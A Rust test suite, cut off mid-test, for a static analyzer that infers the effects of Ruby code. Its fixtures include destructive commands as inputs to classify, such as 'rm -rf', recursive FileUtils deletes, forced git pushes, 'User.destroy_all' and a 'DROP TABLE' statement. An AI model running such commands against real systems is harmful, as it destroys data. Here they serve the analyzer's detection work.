    assert!(configure.summary.effects.iter().any(|effect| {
        effect.operation.0 == "environment.write"
            && is_env_name(effect, "DEBUG")
            && effect.attributes.get("unset") == Some(&effinterp_proto::AttrValue::Bool(true))
    }));
}

#[test]
fn dir_entries_and_yaml_load_are_fs_reads() {
    let plan = ruby(
        r#"Dir.entries("/srv/data")
YAML.load_file("/etc/app.yml")"#,
    );
    let reads: Vec<Option<&str>> = plan
        .effects
        .iter()
        .filter(|e| e.operation.0 == "filesystem.read")
        .map(fs_path)
        .collect();
    assert!(reads.contains(&Some("/srv/data")));
    assert!(reads.contains(&Some("/etc/app.yml")));
}

#[test]
fn io_popen_array_argv_with_dynamic_part_is_process_exec() {
    // Argv-form popen with a non-literal element: the executable name is
    // still recovered from the literal head.
    let plan = ruby(
        r#"def status(dir)
  IO.popen(['git', '-C', dir, 'status', '--porcelain'])
end
status(repo)"#,
    );
    let exec = plan
        .effects
        .iter()
        .find(|e| e.operation.0 == "process.exec")
        .expect("process.exec");
    assert!(matches!(
        &exec.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::Process { executable, .. }
        } if executable == "git"
    ));
}

#[test]
fn kernel_system_literal_nests_shell() {
    let plan = ruby(r#"Kernel.system("rm -rf /tmp/x")"#);
    assert!(ops(&plan).contains(&"filesystem.delete"));
}

#[test]
fn popen_mode_and_system_options_keep_the_single_shell_command_form() {
    for (source, executable, operand, filesystem_op) in [
        (r#"system("rm", "a")"#, "rm", "a", Some("filesystem.delete")),
        (
            r#"Process.spawn("mkdir", "w")"#,
            "mkdir",
            "w",
            Some("filesystem.create"),
        ),
        (r#"exec("cat", "rb")"#, "cat", "rb", Some("filesystem.read")),
        (r#"Kernel.system("echo", "a")"#, "echo", "a", None),
        (
            r#"Open3.capture2("cat", "r+")"#,
            "cat",
            "r+",
            Some("filesystem.read"),
        ),
        (
            r#"Open3.popen3("rm", "wb")"#,
            "rm",
            "wb",
            Some("filesystem.delete"),
        ),
    ] {
        let plan = ruby(source);
        assert!(
            plan.effects.iter().any(|effect| matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::Process { executable: actual, argv, .. },
                } if effect.operation.0 == "process.exec" && actual == executable
                    && argv == &[ResourceExpr::Literal { value: operand.into() }]
            )),
            "{source}: {:?}",
            plan.effects
        );
        if let Some(operation) = filesystem_op {
            assert!(
                plan.effects.iter().any(|effect| {
                    effect.operation.0 == operation
                        && fs_path(effect) == Some(format!("/w/{operand}").as_str())
                }),
                "{source}: {:?}",
                plan.effects
            );
        }
    }

    let popen = ruby(r#"IO.popen("ps aux | grep puma", "r", chdir: "/srv")"#);
    for executable in ["ps", "grep"] {
        assert!(
            popen.effects.iter().any(|effect| matches!(
                &effect.resource,
                ResourceExpr::Concrete {
                    identity: ResourceIdentity::Process { executable: actual, cwd: Some(cwd), .. },
                } if effect.operation.0 == "process.exec" && actual == executable
                    && matches!(cwd.as_ref(), ResourceExpr::Concrete {
                        identity: ResourceIdentity::FsPath { path },
                    } if path == "/srv")
            )),
            "{executable}: {:?}",
            popen.effects
        );
    }
    assert!(
        popen
            .boundaries
            .iter()
            .all(|boundary| boundary.reason.as_str() != "unmodeled_command"),
        "{:?}",
        popen.boundaries
    );

    let system = ruby("opts = {}\nsystem('rm -rf /tmp/z', opts)");
    assert!(
        system.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.delete" && fs_path(effect) == Some("/tmp/z")
        }),
        "{:?}",
        system.effects
    );
}

#[test]
fn dynamic_exec_is_process_exec_effect() {
    // `Kernel.exec(project.render)` — the command is unrecoverable, but the
    // process spawn itself is a fact, not just a boundary.
    let plan = ruby(r#"Kernel.exec(project.render)"#);
    let exec = plan
        .effects
        .iter()
        .find(|e| e.operation.0 == "process.exec")
        .expect("process.exec");
    assert!(matches!(&exec.resource, ResourceExpr::Unresolved { .. }));
}

#[test]
fn class_method_call_composes_constructor_and_method() {
    let plan = ruby(
        r#"module M
  class Runner
    def initialize(root)
      FileUtils.rm_rf(root)
    end

    def go
      File.read("/etc/app.conf")
    end
  end
end
M::Runner.new("/var/lib/app").go"#,
    );
    let del = plan
        .effects
        .iter()
        .find(|e| e.operation.0 == "filesystem.delete")
        .expect("constructor effect");
    assert_eq!(fs_path(del), Some("/var/lib/app"));
    let read = plan
        .effects
        .iter()
        .find(|e| e.operation.0 == "filesystem.read")
        .expect("method effect");
    assert_eq!(fs_path(read), Some("/etc/app.conf"));
}

#[test]
fn module_summaries_exposes_parameterized_summary() {
    // Reach through the public repo-facing API indirectly: analyze a caller
    // and confirm the argument specialization worked (proves summaries).
    let plan = ruby(
        r#"require "fileutils"
def wipe(root, name)
  FileUtils.rm_rf(File.join(root, name))
end
wipe("/cache", tenant)"#,
    );
    let del = plan
        .effects
        .iter()
        .find(|e| e.operation.0 == "filesystem.delete")
        .expect("delete");
    // root specialized to /cache; name stays symbolic -> a Join.
    assert!(matches!(del.resource, ResourceExpr::Join { .. }));

    // Repository storage must retain the callable's proof, not only its
    // effects. Branch-arm occurrences remain distinct optional slots.
    let summary = module_summaries(
        "def run(flag, path)\n File.delete(path)\n if flag\n  File.delete('/arm')\n else\n  File.delete('/arm')\n end\n File.delete('/tail')\nend\ndef call_other\n Other.run\n File.delete('/after')\nend\n",
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    let stored = serde_json::to_vec(&summary).unwrap();
    let restored: effinterp_engine::ModuleSummary = serde_json::from_slice(&stored).unwrap();
    let run = restored
        .functions
        .iter()
        .find(|function| function.name == "run")
        .unwrap();
    assert_eq!(run.summary.effects.len(), 4);
    let requirements =
        run.summary
            .control_flow
            .requirements(&mut |_| false, &mut |_| None, &mut |_, _| true);
    for (slot, required) in [true, false, false, true].into_iter().enumerate() {
        assert_eq!(
            requirements
                .on_success
                .contains(&effinterp_engine::ControlFact::Effect(slot as u32)),
            required,
            "effect slot {slot}"
        );
    }
    let call = restored
        .functions
        .iter()
        .find(|function| function.name == "call_other")
        .unwrap();
    assert_eq!(call.calls.len(), 1);
    let requirements =
        call.summary
            .control_flow
            .requirements(&mut |_| false, &mut |_| None, &mut |_, _| true);
    assert!(
        requirements
            .on_success
            .contains(&effinterp_engine::ControlFact::Call(0))
    );
    assert!(
        !requirements
            .on_success
            .contains(&effinterp_engine::ControlFact::Effect(0))
    );
}

/// Stat-flavored `File` probes (stat/lstat/exist?/readlink/...) are metadata
/// reads carrying the fsutils `metadata` attribute; content reads stay
/// unmarked.
#[test]
fn file_stat_probes_are_metadata_reads() {
    let plan = ruby("File.lstat('/a')\nFile.readlink('/b')\nFile.exist?('/c')\nFile.read('/d')");
    let read_attr = |path: &str| {
        plan.effects
            .iter()
            .find(|e| e.operation.0 == "filesystem.read" && fs_path(e) == Some(path))
            .map(|e| e.attributes.get("metadata").cloned())
            .unwrap_or_else(|| panic!("no read of {path}: {:?}", ops(&plan)))
    };
    for probe in ["/a", "/b", "/c"] {
        assert_eq!(
            read_attr(probe),
            Some(effinterp_proto::AttrValue::Bool(true))
        );
    }
    assert_eq!(read_attr("/d"), None);
}

/// Without a command-table DSL, `Cls.start` is just that one method.
#[test]
fn start_without_command_table_does_not_fire_siblings() {
    let plan = ruby(
        r#"class App
  def start
    File.read("/ok")
  end
  def wipe
    FileUtils.rm_rf("/nope")
  end
end
App.start
"#,
    );
    assert!(
        plan.effects
            .iter()
            .any(|e| { e.operation.0 == "filesystem.read" && fs_path(e) == Some("/ok") }),
        "start itself must run: {:?}",
        ops(&plan)
    );
    assert!(
        !plan.effects.iter().any(|e| fs_path(e) == Some("/nope")),
        "a sibling without a command table must not run: {:?}",
        plan.effects
    );
}

/// A block at a call site (`entries { register }`) contributes its body.
#[test]
fn block_body_at_call_site_is_executed() {
    let plan = ruby(
        r#"def load_all
  entries do
    FileUtils.rm_rf("/from-block")
  end
end
def entries
  yield
end
load_all
"#,
    );
    assert!(
        plan.effects
            .iter()
            .any(|e| { e.operation.0 == "filesystem.delete" && fs_path(e) == Some("/from-block") }),
        "block body must run: {:?}",
        ops(&plan)
    );
}

/// `@mgr ||= Engine.new` types later `@mgr.launch` through the constructed class.
#[test]
fn memoized_ivar_types_receiver() {
    let plan = ruby(
        r#"class Engine
  def launch
    FileUtils.rm_rf("/data")
  end
end
class App
  def start
    @mgr ||= Engine.new
    @mgr.launch
  end
end
App.new.start
"#,
    );
    assert!(
        plan.effects
            .iter()
            .any(|e| { e.operation.0 == "filesystem.delete" && fs_path(e) == Some("/data") }),
        "typed ivar must dispatch: {:?}",
        ops(&plan)
    );
}

/// A getter that returns a constructed manager types `engine.launch`.
#[test]
fn getter_return_types_manager_dispatch() {
    let plan = ruby(
        r#"class Engine
  def launch
    Process.spawn("rm", "-rf", "/tmp/work")
  end
end
class App
  def engine
    @engine ||= begin
      Engine.new
    end
  end
  def start
    engine.launch
  end
end
App.new.start
"#,
    );
    let exec = plan
        .effects
        .iter()
        .find(|e| e.operation.0 == "process.exec")
        .expect("process.exec from manager launch");
    assert!(
        matches!(
            &exec.resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::Process { executable, .. }
            } if executable == "rm"
        ),
        "manager spawn must name rm: {:?}",
        exec.resource
    );
}

#[test]
fn proc_bodies_are_deferred_until_exact_invocation() {
    let plan = ruby(
        r#"dormant = proc { FileUtils.rm_rf("/dormant-proc") }
active = -> { FileUtils.rm_rf("/active-proc") }
active.call
"#,
    );
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete" && fs_path(effect) == Some("/active-proc")
    }));
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| fs_path(effect) == Some("/dormant-proc"))
    );
}

#[test]
fn an_exact_block_pass_invokes_its_proc() {
    let plan = ruby(
        r#"work = proc { |path| File.write(path, "x") }
["/from-proc-a", "/from-proc-b"].each(&work)
"#,
    );
    for path in ["/from-proc-a", "/from-proc-b"] {
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "filesystem.write" && fs_path(effect) == Some(path)
            }),
            "missing {path}: {:?}",
            plan.effects
        );
    }

    let summary = module_summaries(
        "def run\n  work = proc { |path| File.write(path, 'x') }\n  ['/summary-a', '/summary-b'].each(&work)\nend\n",
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    let run = summary
        .functions
        .iter()
        .find(|function| function.name == "run")
        .unwrap();
    for path in ["/summary-a", "/summary-b"] {
        assert!(
            run.summary.effects.iter().any(|effect| {
                effect.operation.0 == "filesystem.write" && fs_path(effect) == Some(path)
            }),
            "missing {path}: {:?}",
            run.summary.effects
        );
    }
}

#[test]
fn exact_block_passes_remain_visible_outside_known_iterators() {
    let plan = ruby(
        r#"cleanup = proc { |path| FileUtils.rm_rf(path) }
["/slice-a", "/slice-b"].each_slice(1, &cleanup)
"#,
    );
    for path in ["/slice-a", "/slice-b"] {
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "filesystem.delete" && fs_path(effect) == Some(path)
            }),
            "missing {path}: {:?}",
            plan.effects
        );
    }

    let summary = module_summaries(
        "def run\n  cleanup = proc { |path| FileUtils.rm_rf(path) }\n  ['/summary-slice'].each_slice(1, &cleanup)\nend\n",
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    let run = summary
        .functions
        .iter()
        .find(|function| function.name == "run")
        .unwrap();
    assert!(run.summary.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete" && fs_path(effect) == Some("/summary-slice")
    }));
}

#[test]
fn block_pass_values_require_a_direct_array_receiver() {
    let source = r#"work = proc { |path| File.write(path, "x") }
Registry.lookup(["/lookup-input"]).each(&work)
["/mapped"].map { |path| path + "/sub" }.each(&work)
"#;
    let plan = ruby(source);
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.write"
                && !matches!(&effect.resource, ResourceExpr::Concrete { .. })),
        "block-pass effects were lost"
    );
    for path in ["/lookup-input", "/mapped"] {
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| fs_path(effect) == Some(path)),
            "fabricated block-pass value {path}"
        );
    }

    let summary = module_summaries(
        &format!("def run\n{source}end\n"),
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    let run = summary
        .functions
        .iter()
        .find(|function| function.name == "run")
        .unwrap();
    assert!(
        run.summary
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.write"
                && !matches!(&effect.resource, ResourceExpr::Concrete { .. })),
        "block-pass summary effects were lost"
    );
    for path in ["/lookup-input", "/mapped"] {
        assert!(
            !run.summary
                .effects
                .iter()
                .any(|effect| fs_path(effect) == Some(path)),
            "fabricated summary block-pass value {path}"
        );
    }
}

#[test]
fn receiverless_kernel_builtins_do_not_create_class_call_edges() {
    let summary = module_summaries(
        "class Runner\n  def run\n    puts 'hello'\n    format('%s', 1)\n    custom_log('x')\n  end\nend\n",
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    let run = summary
        .functions
        .iter()
        .find(|function| function.name == "Runner.run")
        .unwrap();
    assert!(
        run.calls
            .iter()
            .all(|edge| { edge.callee != "self.puts" && edge.callee != "self.format" })
    );
    assert!(
        run.calls
            .iter()
            .any(|edge| edge.callee == "self.custom_log")
    );
}

#[test]
fn receiverless_user_methods_can_shadow_kernel_builtins() {
    let source = r#"class Runner
  def load
    File.write('/loaded', 'yes')
  end

  def run
    load
  end
end
Runner.new.run
"#;
    let plan = ruby(source);
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.write" && fs_path(effect) == Some("/loaded")
    }));

    let summary = module_summaries(
        source,
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    let run = summary
        .functions
        .iter()
        .find(|function| function.name == "Runner.run")
        .unwrap();
    assert!(run.calls.iter().any(|edge| edge.callee == "Runner.load"));
}

#[test]
fn qualified_same_file_receivers_keep_their_exact_namespace() {
    let plan = ruby(
        r#"module App
  class Runner
    def run
      File.delete('/app-runner')
    end
  end
end
module Other
  class Runner
    def run
      File.delete('/other-runner')
    end
  end
end
Other::Runner.new.run
Missing::Runner.new.run
"#,
    );
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete" && fs_path(effect) == Some("/other-runner")
    }));
    assert!(
        !plan.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.delete" && fs_path(effect) == Some("/app-runner")
        }),
        "wrong namespace dispatched: {:?}",
        plan.effects
    );
}

#[test]
fn receiverless_calls_use_same_file_bases_mixins_and_top_level_defs() {
    let plan = ruby(
        r#"def top_cleanup
  File.delete("/top-level")
end
module Cleanup
  def mixin_cleanup
    File.delete("/mixin")
  end
end
class Base
  def inherited_cleanup
    File.delete("/inherited")
  end
end
class Runner < Base
  include Cleanup
  def run
    top_cleanup
    inherited_cleanup
    mixin_cleanup
  end
end
Runner.new.run
"#,
    );
    for path in ["/top-level", "/inherited", "/mixin"] {
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "filesystem.delete" && fs_path(effect) == Some(path)
            }),
            "missing {path}: {:?}",
            plan.effects
        );
    }
}

#[test]
fn private_and_protected_methods_are_not_public_callable_surfaces() {
    let summary = module_summaries(
        "class App\n  def run; end\n  private\n  def secret; File.delete('/secret'); end\n  protected\n  def guarded; end\nend\n",
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    let visibility = |name: &str| {
        summary
            .functions
            .iter()
            .find(|function| function.name == name)
            .map(|function| function.visibility)
    };
    assert_eq!(visibility("App.run"), Some(CallableVisibility::Public));
    assert_eq!(visibility("App.secret"), Some(CallableVisibility::Internal));
    assert_eq!(
        visibility("App.guarded"),
        Some(CallableVisibility::Internal)
    );
}

#[test]
fn instance_visibility_does_not_hide_singleton_methods() {
    let summary = module_summaries(
        "class App\n  private\n  def self.build; end\n  class << self\n    def publish; end\n    private\n    def hidden; end\n  end\nend\n",
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    let visibility = |name: &str| {
        summary
            .functions
            .iter()
            .find(|function| function.name == name)
            .map(|function| function.visibility)
    };
    assert_eq!(visibility("App.build"), Some(CallableVisibility::Public));
    assert_eq!(visibility("App.publish"), Some(CallableVisibility::Public));
    assert_eq!(visibility("App.hidden"), Some(CallableVisibility::Internal));
}

#[test]
fn private_singleton_visibility_does_not_hide_same_named_instance_method() {
    let summary = module_summaries(
        "class App\n  def run; end\n  class << self\n    private\n    def run; end\n  end\nend\n",
        Lang::Ruby,
        "app.rb",
        ScopeKey::Module {
            key: "app.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    let run = summary
        .functions
        .iter()
        .find(|function| function.name == "App.run")
        .unwrap();
    assert_eq!(run.visibility, CallableVisibility::Public);
}

#[test]
fn rescue_and_ensure_paths_remain_visible() {
    let plan = ruby(
        "begin\n  File.delete('/try')\nrescue StandardError\n  File.delete('/rescue')\nensure\n  File.delete('/ensure')\nend\n",
    );
    for path in ["/try", "/rescue", "/ensure"] {
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.delete" && fs_path(effect) == Some(path)
        }));
    }
}

fn one_effect<'a>(plan: &'a effinterp_proto::Plan, operation: &str) -> &'a effinterp_proto::Effect {
    let effects: Vec<_> = plan
        .effects
        .iter()
        .filter(|effect| effect.operation.as_str() == operation)
        .collect();
    assert_eq!(effects.len(), 1, "{operation}: {:?}", plan.effects);
    effects[0]
}

fn assert_no_untyped_resource(plan: &effinterp_proto::Plan) {
    assert!(
        plan.boundaries
            .iter()
            .all(|boundary| boundary.reason.as_str() != "untyped_resource")
    );
}

#[test]
fn relative_net_http_is_an_unresolved_network_resource() {
    let plan = ruby("require \"net/http\"; Net::HTTP.get(URI(\"/x\"))");
    assert!(matches!(
        &one_effect(&plan, "network.request").resource,
        ResourceExpr::Unresolved { family } if family.0 == "network"
    ));
    assert_no_untyped_resource(&plan);
}

#[test]
fn constant_url_arguments_are_retyped_at_the_network_sink() {
    let plan = ruby(
        "require \"open-uri\"\nRELEASE_URL = \"https://e.com/r.tgz\"\ndef fetch(url); URI.open(url) { |io| io.read }; end\nfetch(RELEASE_URL)",
    );
    assert!(matches!(
        &one_effect(&plan, "network.request").resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::NetworkEndpoint { host, .. }
        } if host == "e.com"
    ));
    assert_no_untyped_resource(&plan);
}

#[test]
fn env_index_is_an_environment_value_at_a_filesystem_sink() {
    let plan = ruby("File.exist?(ENV['BUNDLE_GEMFILE'])");
    assert!(matches!(
        &one_effect(&plan, "environment.read").resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::EnvironmentVariable { name },
        } if name == "BUNDLE_GEMFILE"
    ));
    let filesystem = one_effect(&plan, "filesystem.read");
    assert!(matches!(
        &filesystem.resource,
        ResourceExpr::Environment { name } if name == "BUNDLE_GEMFILE"
    ));
    assert_eq!(
        filesystem.attributes.get("metadata"),
        Some(&effinterp_proto::AttrValue::Bool(true))
    );
    assert_no_untyped_resource(&plan);
}

#[test]
fn file_join_preserves_an_environment_value() {
    let plan =
        ruby("require \"fileutils\"\nFileUtils.rm_rf(File.join(ENV[\"APP_ROOT\"], \"cache\"))");
    let effect = one_effect(&plan, "filesystem.delete");
    assert_eq!(
        effect.attributes.get("recursive"),
        Some(&effinterp_proto::AttrValue::Bool(true))
    );
    assert!(matches!(
        &effect.resource,
        ResourceExpr::Join { parts }
            if parts.len() == 2
                && matches!(&parts[0], ResourceExpr::Environment { name } if name == "APP_ROOT")
                && matches!(
                    &parts[1],
                    ResourceExpr::Concrete {
                        identity: ResourceIdentity::FsPath { path },
                    } if path == "cache"
                )
    ));
    assert_no_untyped_resource(&plan);
}

#[test]
fn in_function_git_push_composes_remote_sync() {
    let plan =
        ruby("def push; system(\"git\", \"push\", \"--force\", \"origin\", \"main\"); end\npush\n");
    let sync = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.remote_sync")
        .expect("in-function git push composes");
    assert_eq!(sync.attributes.get("force"), Some(&AttrValue::Bool(true)));
    assert_eq!(sync.attributes.get("push"), Some(&AttrValue::Bool(true)));
}

#[test]
fn helper_shell_command_composes_rm() {
    let plan = ruby("def helper(cmd); system(cmd); end\nhelper(\"rm -rf /tmp/z\")\n");
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.delete" && fs_path(effect) == Some("/tmp/z")
    }));
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert_eq!(
        delete.attributes.get("recursive"),
        Some(&AttrValue::Bool(true))
    );
}

#[test]
fn system_chdir_becomes_exec_cwd() {
    let plan = ruby("system(\"git pull\", chdir: \"infra/\")\n");
    let exec = plan
        .effects
        .iter()
        .find_map(|effect| match &effect.resource {
            ResourceExpr::Concrete {
                identity:
                    ResourceIdentity::Process {
                        executable,
                        cwd: Some(cwd),
                        ..
                    },
            } if executable == "git" => Some(cwd.as_ref()),
            _ => None,
        })
        .expect("git exec keeps chdir cwd");
    assert!(
        matches!(
            exec,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            } if path.contains("infra")
        ),
        "cwd={exec:?}"
    );
}

#[test]
fn partial_argv_nests_unknown_words() {
    let removal = ruby("path = ARGV[0]\nsystem(\"rm\", path)");
    assert!(
        removal.effects.iter().any(|effect| matches!(
            &effect.resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::Process { executable, argv, .. },
            } if effect.operation.0 == "process.exec" && executable == "rm"
                && matches!(argv.as_slice(), [ResourceExpr::Unresolved { .. }])
        )),
        "{:?}",
        removal.effects
    );
    assert!(
        removal.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.delete"
                && matches!(&effect.resource, ResourceExpr::Unresolved { family }
                if family.0 == "filesystem")
        }),
        "{:?}",
        removal.effects
    );

    let plan = ruby("remote = unknown\nsystem(\"git\", \"push\", remote, \"main\")\n");
    let argv = plan
        .effects
        .iter()
        .find_map(|effect| match &effect.resource {
            ResourceExpr::Concrete {
                identity:
                    ResourceIdentity::Process {
                        executable, argv, ..
                    },
            } if effect.operation.0 == "process.exec" && executable == "git" => Some(argv),
            _ => None,
        })
        .expect("git process argv");
    assert_eq!(argv.len(), 3, "{argv:?}");
    assert_eq!(
        argv[0],
        ResourceExpr::Literal {
            value: "push".into()
        }
    );
    assert!(
        matches!(argv[1], ResourceExpr::Unresolved { .. }),
        "{argv:?}"
    );
    assert_eq!(
        argv[2],
        ResourceExpr::Literal {
            value: "main".into()
        }
    );
}

#[test]
fn constant_receiver_calls_are_loud() {
    let plan = ruby(
        r#"namespace :cleanup do
task accounts: :environment do
User.destroy_all
RuboCop::RakeTask.new
Rails.env.production?
ActiveRecord::Base.connection.execute("DROP TABLE IF EXISTS legacy_events")
end
end"#,
    );
    for callee in [
        "User.destroy_all",
        "RuboCop::RakeTask.new",
        "Rails.env.production?",
        "ActiveRecord::Base.connection.execute",
    ] {
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "unresolved_call"
                    && boundary
                        .detail
                        .as_deref()
                        .is_some_and(|detail| detail.contains(callee))),
            "{callee}: {:?}",
            plan.boundaries
        );
    }
    let missing_method = ruby("module App; class Purger; end; end; App::Purger.run");
    assert!(
        missing_method
            .boundaries
            .iter()
            .any(|b| b.callee.as_ref().is_some_and(|c| c.symbol.contains("run")))
    );
    let external = ruby(r#"HTTParty.delete("https://x")"#);
    assert_eq!(
        external
            .boundaries
            .iter()
            .filter(|b| b.reason.as_str() == "unresolved_call")
            .count(),
        1
    );
    for source in [
        "class Purger; def self.run; end; end; Purger.run",
        r#"FileUtils.rm_rf("/x")"#,
    ] {
        let plan = ruby(source);
        assert!(
            !plan
                .boundaries
                .iter()
                .any(|b| b.reason.as_str() == "unresolved_call"),
            "{:?}",
            plan.boundaries
        );
    }
}

#[test]
fn ruby_x_reads_only_the_embedded_program() {
    let shim = "#!/bin/sh\nexec ruby -x \"$0\"\n#!/usr/bin/env ruby\nFile.delete('/tmp/ruby-x')\n";
    let plan = Engine::new()
        .with_resolver(Box::new(RubySources(HashMap::from([(
            "shim".into(),
            shim.into(),
        )]))))
        .analyze(&Subject::Exec {
            argv: vec!["sh".into(), "shim".into()],
            cwd: Some(".".into()),
            context: Default::default(),
        })
        .unwrap();
    assert!(
        plan.execution_graph
            .nodes
            .iter()
            .any(|node| matches!(&node.subject,
        Subject::Exec { argv, .. } if argv == &["ruby", "-x", "shim"]))
    );
    assert!(
        plan.effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete"
                && fs_path(effect) == Some("/tmp/ruby-x"))
    );
    for (source, has_program) in [
        (
            "#!/bin/sh\nexec ruby -x \"$0\"\n#!/usr/bin/env ruby\nFile.delete('/tmp/ruby-x')\n",
            true,
        ),
        ("#!/bin/sh\necho not-ruby\n", false),
    ] {
        let plan = Engine::new()
            .with_resolver(Box::new(RubySources(HashMap::from([(
                "shim".into(),
                source.into(),
            )]))))
            .analyze(&Subject::Exec {
                argv: vec!["ruby".into(), "-x".into(), "shim".into()],
                cwd: Some(".".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert_eq!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.delete"
                    && fs_path(effect) == Some("/tmp/ruby-x")),
            has_program
        );
        assert_eq!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "unrecoverable_source"),
            !has_program
        );
        if has_program {
            assert!(plan.execution_graph.nodes.iter().any(|node| matches!(&node.subject, Subject::Source { language, source, .. } if language == "ruby" && source.starts_with("#!/usr/bin/env ruby"))));
        }
    }
}

#[test]
fn load_path_roots_require_static_file_evidence() {
    let source = r##"
dir = __dir__
ROOT = Pathname(dir).parent.realpath
$LOAD_PATH.insert(0, ROOT.to_s)
$:.unshift(File.expand_path("../core", __dir__))
$LOAD_PATH.push(File.join(__dir__, "src"))
$LOAD_PATH << "#{__dir__}/extra"
$LOAD_PATH.prepend(Pathname(__dir__).join("code").freeze)
$LOAD_PATH.push(File.dirname(__FILE__))
next_dir = __dir__
next_dir = Pathname(next_dir).join("rebound")
$LOAD_PATH.push(next_dir)
dir = ENV["LIB"]
$LOAD_PATH.push(dir)
$LOAD_PATH.push(ENV["LIB"], ARGV[0], Gem.path, "not-a-pathname".parent, "unanchored", File.join("relative", "cwd"))
dir = __dir__
if unknown
  dir = ENV["LIB"]
end
$LOAD_PATH.push(dir)
def hidden
  $LOAD_PATH.push(File.join(__dir__, "hidden"))
end
"##;
    let summary = module_summaries(
        source,
        Lang::Ruby,
        "bin/run.rb",
        ScopeKey::Module {
            key: "bin/run.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    assert_eq!(
        summary.load_path_roots,
        [
            "./..",
            "./../core",
            "./src",
            "./extra",
            "./code",
            ".",
            "./rebound"
        ]
    );
    let plan = ruby("$LOAD_PATH.unshift(File.expand_path('../core', __dir__))\nputs 'run'\n");
    assert!(
        plan.boundaries
            .iter()
            .all(|boundary| boundary.reason != "unresolved_call"),
        "{:?}",
        plan.boundaries
    );
    let mut aliases = String::from("p0 = __dir__\n");
    for index in 1..=14 {
        aliases.push_str(&format!(
            "p{index} = File.join(p{}, p{})\n",
            index - 1,
            index - 1
        ));
    }
    aliases.push_str("$LOAD_PATH.unshift(p14)\n");
    let bounded = module_summaries(
        &aliases,
        Lang::Ruby,
        "run.rb",
        ScopeKey::Module {
            key: "run.rb".into(),
        },
        &effinterp_engine::SummaryBudget::for_lang(&effinterp_engine::default_limits(), Lang::Ruby),
    );
    assert!(bounded.load_path_roots.is_empty());
}

#[test]
fn parsed_ruby_top_level_distinguishes_declarations_from_execution() {
    for source in [
        "App::Cleaner.prepend(Faster)",
        "App::Cleaner.singleton_class.include(Faster)",
        "X = %w[a b].freeze",
        "X = File.delete('/at-require-time')",
        "require 'json'\nclass App; def run; File.delete('/later'); end; end",
        "sig { returns(String) }\ndef value; 'x'; end",
    ] {
        assert_eq!(
            effinterp_engine::ruby_runs_top_level(source),
            Some(false),
            "{source}"
        );
    }
    for source in [
        "puts('run')",
        "if __FILE__ == $0; run; end",
        "worker.include(Faster)",
        "File.delete('/now')",
    ] {
        assert_eq!(
            effinterp_engine::ruby_runs_top_level(source),
            Some(true),
            "{source}"
        );
    }
    assert_eq!(effinterp_engine::ruby_runs_top_level("def broken("), None);
}

#[test]
fn literal_builtin_dispatch_preserves_receiver_and_operand_identity() {
    for (source, operation, path) in [
        (
            r#"File.truncate("/tmp/state", 0)"#,
            "filesystem.write",
            "/tmp/state",
        ),
        (
